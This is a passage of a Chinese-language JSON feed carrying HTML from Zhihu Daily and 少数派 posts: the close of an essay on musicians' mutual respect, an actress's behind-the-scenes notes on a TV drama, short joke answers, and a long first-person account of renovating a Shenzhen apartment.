和 jimi Hendrix，你玩儿电子不知道声音的原理和风格脉络、与各时期文化的关系，就单纯把它当成音色拓展。当然你也可以这么坚持，但就不要怪电子音乐人嫌你不尊重他们的精力和专业。电子音乐人靠频段就能控制情绪，是一种声音物理，本质上和你在乐器上靠演奏制造情绪张力是一样的。但是手法不同，擅长出彩的方向不同，并没有什么本质的区别。</p>\n<p>坂本龙一在玩儿 YMO 的时候已经是一个非常优秀的钢琴演奏家了。他在纪录片《Coda》中说过一句话，我印象非常深刻，他来解释用电脑做音乐有什么好处的时候，演示了一段琶音，他先用手弹奏，到了手跟不上的速度时，电脑就完成了这个高速的琶音，他说，这样就不用十年二十年地练习钢琴了。（B 站的这个视频中 38:10 秒左右的一段）</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV11J411a7LL%3Ffrom%3Dsearch%26seid%3D6814041396723493096\" target=\"_blank\" rel=\"nofollow noreferrer\">【完整版】坂本龙一：终曲 Ryuichi.Sakamoto.-.Coda.2017.1080p.Bluray_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili</a></p>\n<p>就像 Jojo mayer 能打出像电子鼓一般的鼓律动一样，这些音乐家都是演奏到了，用电子乐来拓展自己不能到达的部分，这是作为一个演奏者，对音乐表达的一种追求，对自我音乐语言的拓展。</p>\n<p>通常，如果能互相尊重地沟通，其实一切问题都能够搞明白。但如果本身不够自信，对对方的音乐语言又不甚了解，说出一些小白的话生怕对方是在贬损自己，立马摆出防御的姿态，进行回击，那么任何沟通，就都难以进行下去了。当然从业多年，如何闷声不响地赚钱走人，每个从业者也许早就学会了。可是能真正不卑不亢地提出自己的意见，真实地探讨，才是更难的。能表达到位更多还是在个人的修炼。</p>\n<p>你不能指望对方能听懂你所有话，所以我们最好先了解别人的语言，再开口说话。在被打脸的时候，不要过于急躁。不交流的话，很多事情是无法自己琢磨明白的，但没有这种打开自我的善意和觉悟的话，也就是还没有做好沟通的准备。那我觉得人可以谦虚一点儿，对自己不了解的事情敬畏一点儿，并且任何时候，学习都是不该停止的。</p>\n<p>但我所描述的所有我遇到的情况，也并没有贬低任何一个细分行业的意思。因为越伴随接触的人越来越多，我越了解到，造成这种创新和突破上最大的困难，其实是“<strong>无论摇滚还是电子，其实对我们而言都只是舶来的音乐，发展时间之短暂，从业人员之良莠不齐，整个学习认知之片面，根本上就是客观存在的。</strong>”</p>\n<p>从业者之间都如此，那么作为只把听音乐当作业余爱好的粉丝来说，大多数情况下，更不觉得学习对方的音乐语言而与对方平等沟通有什么重要的了。更多的时候，也许只是在附和某一种乐迷身份所能带给自己的社会标签，这种加持也是人社会属性的体现，未尝不可被理解。</p>\n<p>但是，作为音乐行业的从业者，如果迎合这样的圈子，并且以封闭地玩儿音乐作为吸引粉丝的方式的话，那么在我看来，只不过是不怎么上进，没什么追求，或者只是懒得去提高自己，觉得比粉丝稍微专业一点儿就够用了；或者感觉“直接否定自己不了解的领域，要比从零开始学习一种新的语言，简单得多“就一边犯懒一边抱着侥幸心理，从而能在行业中得过且过罢了。</p>\n<p>说到底，这不过是自欺欺人。甚至当细分领域的壁垒建立，专业人士还试图为年轻和新进的音乐人制造人为的障碍的话，我常常想，其实只不过是这些人，没有自己想象中那么热爱音乐罢了。很多时候，做音乐只是一门营生，一个生意。情怀之类的东西，在现实面前总要低头的。特别是在如今这个各行各业都在谈论“内卷”的时代，音乐圈也并无什么特别。而那些被圈子消磨很久还能保持锐气，常在以卵击石的人，大概都是经历过更多让人“难忘初心”的时刻，并且没被生活逼到妥协那一步的人吧。</p>\n<p>我觉得一切都可以理解，但不必同情。</p>\n<p>每个人都在做自己能做的事，尽量寻找着能做和喜欢之事之间的平衡。总有人在你不知道的地方努力，不以外界的某种潮流做标准。作为一个投身音乐领域的自由职业者，我真心希望这样的人更多一些。有时候同这样的人交谈短短的几句话，常常就使我仿佛醍醐灌顶。但其实很多时候，不仅和同行，和圈外的人聊到这些，我也常常感觉自己被打开了，十分兴奋，不想退回到舒适的区域。</p>\n<p>这也让我愈发相信，只要你打开自己，永远进步，无论你的人生轨迹如何改变，你总能做出更加接近自我内心音乐的作品的。</p>\n<p>以上</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/446417893\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738870"},{"title":"电视剧《我在他乡挺好的》有哪些细思极恐的细节？","date":"2021-08-04 23:07:11","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-67f597d6b8a53866cb0c82541cf123c6_l.jpg?source=8673f162\"><span>一个周，</span><span>演员</span>\n<a href=\"https://www.zhihu.com/question/473111119/answer/2036709209\" hidden>阅读原文</a>\n</div>\n<div>\n<p>1.第一集乔夕辰吃止疼药，是因为那天我刚好也来例假了，本身工作吃止疼药已经成为我的习惯了。所以就和导演商量把这个加到了第一集开会前。</p>\n<p>2.第一集乔夕辰和胡晶晶在地铁，同时蹲下，然后朝着两个出口离去。也暗示着她们走向了不同的人生命运。（场外导演补充“这个城市中不愉快的事情可能发生在每个人身上，无论是乔夕辰还是任何别人其实都和胡晶晶一样，在那个岔路口你们没有看到彼此，从那个地铁站开始走向了不同的人生方向。也是希望大家能像乔夕辰一样 选择坚强一些，无论遇见什么坎都是暂时的。脆弱留在心里，人生一定要坚强。）</p>\n<p>3.乔乔与合租的室友吵架时，两个人面红耳赤，室友脱口而把乔夕辰叫成了乔辰夕，这不是提前设计，两个人正好都在气头上，就顺着演下去了。但是我们都认为这个叫错名字非常巧妙，导演也保留了这一条。（大伯把狗蛋当成了真的狗，也是一个“突发事件”导演也保留了大伯口误的那条。）</p>\n<p>4.有些镜头拍手特写，乔乔的指甲油并不是很匀，一是我本人爱咬指甲，二是我觉得乔乔虽然也爱美，但是有时候很忙碌很糙。不像许言南嘉姐那种，指甲保护的那么好。虽然是手特写，但是我们并没有把指甲油补的很漂亮。（处女座可有可无小巧思又来惹。）</p>\n<p>5.许言和乔夕辰躺在床上说“在线？”那是她自己加的，她平时就那么“骚扰”我。</p>\n<p>6.给南嘉姐过生日那段，我和许言从桌子下面拿蛋糕给她惊喜那段，是我和孙千提前商量的，素汐姐本人也不知情。（想逗逗她）</p>\n<p>7.第二集医院楼梯间，乔乔和简亦繁的相遇，其实这个事情到最后乔乔也不知道。她只是知道她们在医院碰见了，但是那个楼梯间，是她内心最私密和最伤痛的时刻，也是她接受了胡晶晶离开的时刻。她从没想过她和简亦繁是在那里相遇的。</p>\n<p>8.第二集乔乔苏晴和简总开会的时候，乔乔一边说简总说的有道理，一边在笔记本打字“呵呵，就你聪明。”这个是来源我身边的朋友和我聊天提供她们在职场发生的一个小趣事，我和导演商量把这个加进去，觉得还挺有趣的。</p>\n<p>9.白宇帆喝酒不用化红妆，因为他只用喝一口就会满脸通红。第五集乔乔扶着简总上车，看到他小脚，顺手用手机拍下来。是现挂，因为真的觉得他脚那样挺逗的，他本人是看片才知道他的脚是这个造型哈哈哈哈哈。</p>\n<p>10.我的狗狗出镜是在第十一集，剧组里白宇帆、导演都有狗，为了争取这个狗狗角色，我们一腾特意洗了澡录了“试戏片段”最终在三只狗狗里“脱颖而出”，希望大家多多支持！！！！</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/473111119\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738853"},{"title":"瞎扯 · 如何正确地吐槽","date":"2021-08-04 23:07:03","description":"\n<div>\n<h2>一个会计的水平能差到什么程度？</h2>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-599f5464c85a8011d27a8a9964eb8fd5_l.jpg?source=8673f162\"><span>棉花糖，</span><span>做过升学培训，会跳舞的大袍子会计</span>\n<a href=\"https://www.zhihu.com/question/314430963/answer/613876211\" hidden>阅读原文</a>\n</div>\n<div>\n账簿的贷方科目全部写的是人名 </div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/314430963\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>游戏《植物大战僵尸1》中有哪些细思恐极的细节？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-851e83508ed6cf64a5c69f91ed3a966c_l.jpg?source=8673f162\"><span>亚里士缺德</span>\n<a href=\"https://www.zhihu.com/question/55082539/answer/669572864\" hidden>阅读原文</a>\n</div>\n<div>\n<p>其实，铁栏门僵尸，是朱自清。</p>\n<p><em>我悄悄地披上大衫，带上门就出去了。</em></p>\n<p><em> -- 朱自清《荷塘月色》</em></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-47ff758fabaeda360c201381c9a81f0a_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/55082539\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>做法医会怕鬼吗？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-6ed8b16483166ff9504ce7e3d287a244_l.jpg?source=8673f162\"><span>南宁彭于晏</span>\n<a href=\"https://www.zhihu.com/question/320699516/answer/668190260\" hidden>阅读原文</a>\n</div>\n<div>\n<p>怕什么 谁在下面没几个亲戚</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/320699516\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>如何幽默风趣地回复「很高兴认识你」？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-05fa57126ec7d56f62b451e9d133eb36_l.jpg?source=8673f162\"><span>青青子琴，</span><span>Valar morghulis</span>\n<a href=\"https://www.zhihu.com/question/31825466/answer/817181396\" hidden>阅读原文</a>\n</div>\n<div>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-dcf192d3c340356d2ee1efef587ba3f5_720w.jpg?source=8673f162\" data-rawwidth=\"739\" data-rawheight=\"367\" data-size=\"normal\" data-default-watermark-src=\"https://pic3.zhimg.com/v2-c0ed46650d8967f393fd6b01d5172ecc_720w.jpg?source=8673f162\" width=\"739\" data-original=\"https://pic1.zhimg.com/v2-dcf192d3c340356d2ee1efef587ba3f5_720w.jpg?source=8673f162\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/31825466\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>丹泽尔.华盛顿在好莱坞的黑人男演员里，是怎样的地位？</h2>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-0f2506cedaa0c7697ff6bf6768ec3286_l.jpg?source=8673f162\"><span>周傑倫，</span><span>心远无成败，山高看月小，不管什么事，没啥大不了！</span>\n<a href=\"https://www.zhihu.com/question/36614027/answer/210071624\" hidden>阅读原文</a>\n</div>\n<div>\n塞缪尔·杰克逊 丹尼尔华盛顿还有古天乐是我最喜欢的三个黑人影星！\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/36614027\">阅读原文<span></span></a></div>\n</div>\n","link":"https://daily.zhihu.com/story/9738888"},{"title":"虽然踩坑但及时止损，这是我的装修故事","date":"2021-08-04 09:23:20","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>2019 年，我和太太 Doris 厌倦了十多年的北漂生活，打算找个地方安顿下来，就在这一年秋天搬家到了深圳。随后不久遇上了来势汹汹的疫情。2020 年 6 月，疫情稍微缓和，我们顺利办妥落户，决定趁自己还勉强买得起，解决一下房票问题。</p>\n<p>我们俩目前无孩有猫，将来考虑要孩子，而且考虑再多养一只猫。家里藏书非常多，其他各种小物件不在少数，而且对娱乐和健身的空间也有一些需求。基于这样的考虑，比较靠近市区的一居或小两居（建筑面积 60-70 平）很难满足我们的这些需求。于是「交通便利」就只好忍痛牺牲掉，改为「以距离换取空间」。</p>\n<p>我们选中的房子在龙岗区地铁沿线，楼龄约 15 年，建筑面积约 90 平，户型比较方正，整体接近正方形。一个 20 平以上的客厅，两个卧室，中间的阳台具备封窗改造的条件。前房主购房后完全没有自住，一直出租至今，各种装修和设施（包括入户门和全部外窗）均严重老化。加之对方诚意出手，在同小区均价基础上又让了大约 10%，我们就没有再犹豫，看房当晚网签。省下来的钱就用来装修。</p>\n<p>完成签约之后没几天，深圳就颁布了新的调控措施（深八条）；按照新规，我们的社保不够年限，会失去买房资格。可以说是惊险地压线上车。</p>\n<p>8 月下旬完成交房，我们为时约一年的装修大战也随之开始。</p>\n<h2>建材超市 vs 设计师，踩坑与出坑</h2>\n<p>我们在装修伊始就差点踩了一个大坑，这个坑叫做「设计」。</p>\n<p>签约之后不久，圈内熟悉情况的朋友就已经推荐了很专业的设计师给我们。当时我们一来不是特别明确自己的需求，二来有些过度自信，觉得只靠我们的沟通和规划就可以做出不错的设计方案，接下来只要有执行和施工就可以搞定。刚好我们租住房子的隔壁有人在请 X 安居负责装修，他们的宣传口径又是「免设计费」，我们就贪了便宜，决定跟风去谈。这一谈，就掉进了一个无底洞。</p>\n<p>X 安居的「设计师」和销售接待了我们，一口承诺可以在我们的预算范围内（最初我们的计划是 3000元 / 平米左右）实现我们提出的各种构想，然后迅速与我们完成了签约。设计图第一稿出得很快，但从事后回看，显然不符合我们的各种需求。本来这里应该上一张 X 安居的设计图给大家欣赏，但那些资料搬家时已经都被扔掉。只能简单做一些描述了：</p>\n<ul>\n<li>客厅基本四面白墙，除了挂电视，就只有几盆绿植和一套电视柜，餐桌大喇喇地摆在正中央，总之是浪费了许多空间；</li>\n<li>次卧名义上是书房，但只有一小面墙留给书架，还设计了榻榻米和地柜（用来装「多余的被褥」）；</li>\n<li>主卧基本上就是把各种家具贴墙摆一圈，缺乏设计感；</li>\n<li>厨房按照水槽→灶台→操作台的顺序安排，动线没有逻辑；</li>\n<li>卫生间借口面积不足，没按我们的需求安排浴缸。</li>\n<li>……</li>\n</ul>\n<p>总之，可以说是套用固有模板的敷衍设计。但我们就这么接受了，可想而知当时有多傻。</p>\n<p>按合同规定，装修的八大类主材中有五大类要在 X 安居购买。我们在设计师的带领下先后拜访了位于店内的各种商家——瓷砖、室内门、卫浴、吊顶、门窗、定制柜、电器……一些品牌的销售顾问纷纷给我们做了预算单。</p>\n<p>随着预算逐渐成型，我也观察到一些令我极为不安的现象，例如一些电器的标价不仅比电商贵很多，比国美等线下店也明显高出一截——然后再疯狂打折，营造出「优惠」的气氛。其他各种主材的报价也是如此，每一项都「稍稍」超出我们预先和设计师沟通的预算。按照这个搞法，电器和软装不算，只到硬装结束，我们就要至少超支 30%。</p>\n<p>同时存在的还有另一个同样诡异的现象：该卖场内的 Wi-Fi 信号极差，速度极慢，4G 则弱到完全不存在。我们甚至无法同步上网核查各种报价，这让我和 Doris 越发感到不对劲。</p>\n<p>等到工长给出辅材 + 工艺的报价单，槽点就更多了。一些辅材规格存疑（例如电线直径与预计会用到的电器功耗不匹配），品牌在阿里巴巴上查不到（怀疑是三无产品），用量与我们家面积不符（某规格电线的采购量达到一两公里）……当我们提出这些疑问时，工长、销售和设计师都无令人信服的解释。我们有了一些不祥的预感。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/02/52663aaeb32177e17b3a1abde0b87b47.png\"><figcaption>这……怎么也用不了两公里电线吧！</figcaption></figure><p>在此情况下，我和 Doris 经过讨论，连夜下定决心，支付 5% 的违约金（幸好有一多半报价单还没付款），从 X 安居跳车逃跑。几千块钱的损失固然肉痛，但更大的代价还在于时间：这一顿踩坑让我们浪费了一个多月，此时已经是 10 月中旬，我们的装修还一点都没开始呢。</p>\n<p>吃了这个大亏，我们终于学乖了，前去拜访了朋友推荐的设计公司——本居设计。本居设计的老兄听说了我们的遭遇，淡淡一笑：那个 X 安居啊，是个建材超市，不会也不可能给你们做出像样的设计滴。</p>\n<p>亲身经历在前，我们无法反驳。</p>\n<p>本居设计请我们填写了很长的需求调查表，其中的项目非常细致，包括家里的某类物品大约有多少件，对某类生活功能的需求高至何种程度，有哪些既往喜欢（想要）的设计风格和案例。为了用人话填写这个表格，我和 Doris （被推着）做了一些功课，再回顾先前和 X 安居的合作，更是惊出一身冷汗——我们原来漏掉了那么多的事情，根本就没有思考清楚！</p>\n<p>后来过了两个月，我们那位用了 X 安居的邻居家竣工了。我们某天路过，从敞开的门口看了一眼，确实毫无设计可言，确实是「四面大白墙，家具围着摆圈圈」。幸好我们及早跳了车。</p>\n<p>回归正题。本居设计的工程师结合我们的调查表，专门花了两个小时，一边展示以往的设计案例，一边帮我们逐项梳理各种生活构想和需求，包括但不限于：</p>\n<ul>\n<li>目前无孩，养了一只猫。将来考虑要孩子，而且考虑再多养一只猫；</li>\n<li>家里的老人可能偶尔来探亲短住。偶尔会有少量朋友来家小聚；</li>\n<li>两人都有升降桌和电脑等设备，需要有 Work from Home 的空间；</li>\n<li>两人都有健身的习惯，需要在客厅配置一些基本的室内健身设备；</li>\n<li>有时会一起看电影或者打游戏，需要配置投影仪和电视屏幕等设备；</li>\n<li>大部分时间会在家做饭，有时还会在家调酒，需要相应的操作空间；</li>\n<li>不想早晨为洗手间打架，至少要在卫生间以外再配置一个洗面台；</li>\n<li>需要智能马桶和一个能泡澡的小浴缸；</li>\n<li>家里有许多藏书（超过 500 册，开本大多又厚又大）和桌游（接近 100 盒），需要充足的储物空间。</li>\n</ul>\n<p>在整理需求之余，设计师对我们的预期也做了一些教育：自住房如要住得比较「舒服」，装修预算应该在 3500-4000 元左右。她向我们展示了一个非常详细的装修项目、工序和材料价格的拆分表，并逐项给我们做了简单介绍。总之，我们最后接受了本居工程师的观点，将预算重新设定至这个范围内，并与本居设计签订了全包设计合同（设计费 350 元/平米）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/02/12bab9afaa783b10834da0ea08d374f4.png\"><figcaption>我们最早找到的「参考案例」，最后大体上还是实现了一些的</figcaption></figure><p>这个设计合同的强制部分只有设计图本身。我们可以自行选择施工方，也可以按本居设计的推荐、选择长期与他们合作的工长。为了方便起见，我们选择了本居设计推荐的工长，并按设计师和工长双方确定的清单购买辅材。本居设计鼓励业主自行选择第三方监理服务。我们对装小蜜和牛角监两家做了一点功课，选了后者的全程监理服务（40 元/平米）。</p>\n<p>主辅材方面同理。我们可以自行选购全部或部分装修主辅材。本居设计有一些长期合作的主材供应商；如果我们接受这些推荐，设计师会陪同我们去选购材料，供应商亦会相应提供折扣。具体细节见下文。</p>\n<p>从提出设计方案、确定工长时起，到装修最终完成、我们搬家为止，我们与本居的设计师们建了 N 多个不同的微信群，就不同的事宜与各个供应商和工长反复沟（si）通（bi）。设计师在装修的各个关键节点和工期过程中也多次上门查看现场，尤其是在比较蛮荒、艰苦的施工前期；我和 Doris 在那段时间刚好工作比较忙，很少有空去监工，设计师在那段时间客串了业主，和监理师一道为我们节约了不少时间和精力。</p>\n<p>从这些角度来看，我和 Doris 都认为这笔设计费确实物有所值。</p>\n<h2>装修前期：懒人的拆拆拆</h2>\n<p>11 月初，我们基本确定了设计方案，与物业完成对接，工长进场，开始艰（yu）苦（kuai）的拆旧工作。</p>\n<p>房子原有的卫生间非常小，为了腾出空间安装浴缸，设计师将卫生间和次卧之间的非承重墙拆除重砌，压缩了一部分次卧的空间。</p>\n<p>阳台和客厅之间的隔断门拆除，直接封闭外侧，将这里和次卧分别做成两个适用于办公的小房间。</p>\n<p>厨房侧面本来有一个很小的生活阳台，中间的隔断全部拆掉，直接封闭外侧；厨房和客厅之间的非承重墙也全部拆除，将来在这里设置一道玻璃拉门，构成一个比较大的开放式厨房。</p>\n<p>其他拆除并清运的东西包括但不限于：所有朝外的塑钢窗、阳台和飘窗的栏杆、室内门、遗留的家具和旧空调、地砖、瓷砖、橱柜、洁具……总之，经过一番打拆，工人们把我们家成功变成了「鬼屋」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/02/db8f8c004254a7c3f5352236e6c1bea5.png\"><figcaption>打拆阶段我们根本没去过现场</figcaption></figure><p>根据我们的需求，设计师利用次卧和卫生间门口的空间设置了第二个洗手台，并在中间新增的「阳光房」外侧安置洗衣机和烘干机，客厅的主照明也预留了卧室门口的双控开关。其他的水电开槽一如常规，不再赘述。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/02/8b81189e0dbf35083a043ef6d3c5f2da.jpg\"><figcaption>电路铺设阶段我们也没去过现场……</figcaption></figure><p>这一阶段的「监工」绝大部分由牛角监的监理师完成。监理师在每个节点上门时都会拍摄全屋视频，对有问题之处逐项拍照总结，还会配一个「牛角监发现此处有问题」的牌子。拆除阶段裸露的钢筋，未拆净的线管，地面和墙体基础层留下的裂痕，漏掉没做电磁屏蔽的穿线，……我们作为外行业主可能不懂、可能无法完全留意到的各种细节，监理师都不会放过。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/02/873185cb4be64157bcecfc4a9e7b3158.png\"><figcaption>这种小细节是我们没时间（也没能力）逐个去抠的</figcaption></figure><p>我们收到监理报告，转给设计师和工长，设计师会再次督促工长处理。监理师则会在下一次上门时复核问题是否解决。工长在每一天、每一周的工作结束时，也会定期在微信群向我们拍照、汇报情况。有了这些机制，我们直到水电验收时才第一次「必须」去现场。</p>\n<p><strong>不过有一点要注意：监理师只能监督各项工艺是否合规、是否有瑕疵和安全隐患，不太可能留意到所有小细节，更无法保证施工效果与预期的功能完全匹配。</strong>例如，监理师无法查验「电工是否真的预埋了设计图上标明的双控电路」。这也给我们后来与工长的撕逼埋下了伏笔。</p>\n<p>到春节放假之前，新房的拆除和重砌完工，墙体和地面的基础层回填做完，卫生间和客厅的吊顶也完成了一部分。因为拆掉的门窗还未新装，整个屋子呈现出狰狞的外观，但总算让人看到了一些希望。</p>\n<h2>装修中期：买买买的苦与乐</h2>\n<p>该拆的东西都拆完，接下来就要展望一下该装的东西装上去是什么样子。我和 Doris 都倾向于现代、极简的风格，在审美和配色上比较倾向于北欧或日式风格，设计师的初始效果图也是基于这些考虑提出的。在春节前后，我们在设计师的陪同或指导下，陆续完成了各种主材的选购。这事就没有偷懒的余地了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/02/f78da9421ca0daee1502311d4e5af49b.png\"><figcaption>左：客厅和厨房使用的大方砖；右：因为贵和麻烦放弃的厨房六角砖</figcaption></figure><p>首先是地砖和瓷砖。我们对木地板毫无执念（也不想花这个钱），对地砖的品牌也没有要求，就选择了本居设计合作的宏兴石材和标致瓷砖。为了宜居效果，我们为两个卧室选择了木纹砖，客厅和厨房选用了 800*800 的水泥色方砖。卫生间和厨房的墙砖则选择了高性价比又朴实的黑白色砖。再加上门槛石和飘窗上的瓷砖，各项全部加起来大概是 10000 元。几块砖在进场后发现有碎裂，供应商二话没说就补发了，态度非常诚恳。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/02/a8b9c1617969dc31f018f2606ba2c9b9.jpg\"><figcaption>美缝、地砖和踢脚线细节</figcaption></figure><p>墙漆方面，我们最初有过彻底工业风、仿水泥墙质地的疯狂想法，后来在设计师的劝说下还是决定回归普通的白墙。在设计师的建议下，我们用了号称「业界最高标准」的大师漆。电视墙为了美感选配了两种彩色漆，比全白稍贵。全屋总价大约在 6000 元出头，可以说「贵就是好」了。</p>\n<p>门窗是我们硬装主材的大头。我们在本居设计推荐的方瑞门窗那里定制了入户门、室外窗、卫生间的玻璃门，还有一个用于厨房的五扇滑轨拉门。这个拉门的主要目的是防家里的猫进厨房，尤其是在家里无人的时候。「防猫门」的造价很高。其他门窗价格就比较亲民。总之，加上金刚纱窗之后，总价不过 X 安居的一半。</p>\n<p>室内门用了本居设计推荐的九鼎旺，为了便于打理选了最简单的样式，五金件都是标配，价格比卖场流行品牌（如 TATA）便宜一半。隔音效果达到了「关上门说话，门外听不到」的程度，客观上不利于家庭和谐（笑）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/02/1542909b7363ee42e108ffe312ff5ff7.png\"><figcaption>最后装满书和桌游的柜子</figcaption></figure><p>另一个大头是定制柜。因为藏书的需求很大，设计师把客厅改造成书房，利用进门后的整面墙设置书柜和储物柜。主卧砌了一个小的「U 型」墙段，衣柜一部分藏进里面，省一块见光板。次卧额外留了一套衣柜，以备老人来暂住。整体配色用白色和原木色搭配，和地砖、墙体、门窗整体都是搭调的。</p>\n<p>本居设计推荐的好莱客有优惠套餐，我们的室内柜体总共用了两份套餐还有余。加上五金件和见光板，全屋整体均价不过 1000元 / 平米（按投影面积算），比 X 安居的供应商（例如 X 菲亚和 X 派）便宜了至少 50%。安装完成后用仪器自测，甲醛的散发量可以接受，TVOC 较高，需要多通风散味。</p>\n<p>橱柜和吧台也是在好莱客定制的。餐边柜的中间单元用了玻璃门和黑色板材，按家里的酒瓶尺寸调整了层高，相比 X 派的报价同样低了 50% 以上。即便如此，我们还是想能省则省。例如，我们嫌好莱客的原装拉篮有点贵，就淘宝买了一个进口拉篮。好莱客的安装师傅照例帮我们装好了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/02/ce5b49ceca4f4c3b4007464f3f7999dc.png\"><figcaption>最右侧厚厚的那货就是防猫门</figcaption></figure><p>卫浴设备方面，我们选择了本居设计推荐的恒洁。智能马桶是「一旦用过就回不去」的配置，强烈推荐，不做解释。不同品牌智能马桶价格可以相差极多。我们用的这款功能完全满足需求，售价大约在 5000 元左右。洗面池、镜柜和花洒都是刚健朴实的款式，价格还算公道。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/02/eeed4d4b31ecfacfa5055ecaf23154c9.jpg\"><figcaption>这里用了一点花砖，配合一个宜家的球灯，实际效果尚可</figcaption></figure><p>浴缸和外面的洗手台各用了一块长虹玻璃隔断，同样是方瑞出品，性价比依然很高。第一次上门时打胶有瑕疵，我们提出之后，师傅很快就上门做了精修，最终效果基本可以让人满意。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/02/e1b0597b493d6338c2e7c34de57e44d0.png\"><figcaption>左：卫生间；右：从次卧看外置洗手台和客厅。为了方便老人使用安装了老年扶手。</figcaption></figure><p>唯一比较难买的只有浴缸。我们卫生间的空间最多只允许放置长度 1.3 米的小浴缸，卖场里的商家要么没有这个尺寸，要么卖得很贵。我们最后求助了万能的淘宝；连同运费和安装，一共花了 2000 出头。</p>\n<p>本居的设计师在其他主材的选购过程中都会至少在场陪同我们一次，另外还会同门窗和定制柜的供应商上门复尺。在定制柜的方案确定前，我们陆续选定了各种厨卫家电的型号，设计师也在此过程中为我们提供参（jing）考（gao），例如告诉我们，「那款冰箱摆在厨房里，是开不了门的」。</p>\n<p>趁着春节和元宵节特惠，我们在淘宝和京东下单购买了一些电器，包括空调、烟机、灶具和热水器。装修早期我们曾经想过装新风和中央空调，但出于成本考虑还是放弃了。三台空调都选了格力，烟机和灶具选了老板，热水器用了美的，都是国产主流品牌，价格透明，不必多说。</p>\n<p>接着是灯具。本居设计推荐的供应商第一次显得「不靠谱」，原因也无非一个「贵」字。照明供应商给出的全屋灯具报价轻松破万。我和老婆对视片刻，心中冷笑三秒，出门左转先去宜家，再上淘宝。最终的方案是厨房用两组赫克塔射灯，主卧装四个纽墨奈射灯，客厅和阳光房配几组雷士射灯，再加上客厅吊顶的灯带，全屋的无主灯照明配置就这样成了。餐桌、吧台和床头为了气氛，又单独买了三个宜家的吊灯。所有灯具加起来大概花了 4000 元，又省了一多半（两张骄傲脸.jpg）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/02/2c997d1261f78ee803db9262d602b81c.jpg\"><figcaption>客厅的照明效果</figcaption></figure><p>其他大件电器刚好等到了 6.18 搞定。因为基本没有预留晾晒衣服的空间，烘干机就成为了刚需。在京东下单了博世的洗衣机 + 烘干机套装，折后价大概是 10000 元出头，以至于上门安装的师傅听了直呼「真便宜」。蒸烤箱和洗碗机选了西门子，各自也薅到了折扣价。冰箱是之前在<a href=\"https://sspai.com/post/64155\" target=\"_blank\">少数派编辑的文章</a>里种草的松下，因为钱花光了，加上 6.18 折扣聊胜于无，就索性迟了一月再下单，直到搬家完毕后才进场。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/02/86dc5362c1881a9b949662d108c2b422.png\"><figcaption>Doris 的工作台，旁边的洞洞板，以及洗烘柜</figcaption></figure><p>装修初期，我们在 X 安居的忽悠下一度对榻榻米和地柜产生过兴趣，后来见到宜家的马尔姆气压床的超大储物空间，就移情别恋了。沙发选了可以变床的弗瑞顿，方便长辈临时留宿。平时如果只有两个人，我们打算以吧台为餐桌，吃饭喝酒两相宜，所以还买了两个宜家的吧凳。</p>\n<p>餐桌和餐椅我们犹豫了一番，最后买了一款比宜家货稍贵的可折叠桌。完全展开后的桌面基本能满足摆桌游和家人聚餐的需求，收起后占地非常小，平时可以把客厅的后半部分完全空出来。</p>\n<p>最后唯一廉价的大概是电视柜。嘴上说着「不想要便宜的宜家款」，最终买了 200 块的淘宝杂牌货。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/02/8e466dfad59960eec3fb07839b0d621f.jpg\"><figcaption>猫：这个沙发归我了</figcaption></figure><h2>装修后期：一边补缺，一边撕逼</h2>\n<p>年后复工，木工装吊顶，油漆工进场刷墙，这部分工作我们仍然很少到场监督。接着是门窗的安装。只有定制柜的生产出现延迟，一直拖到 5 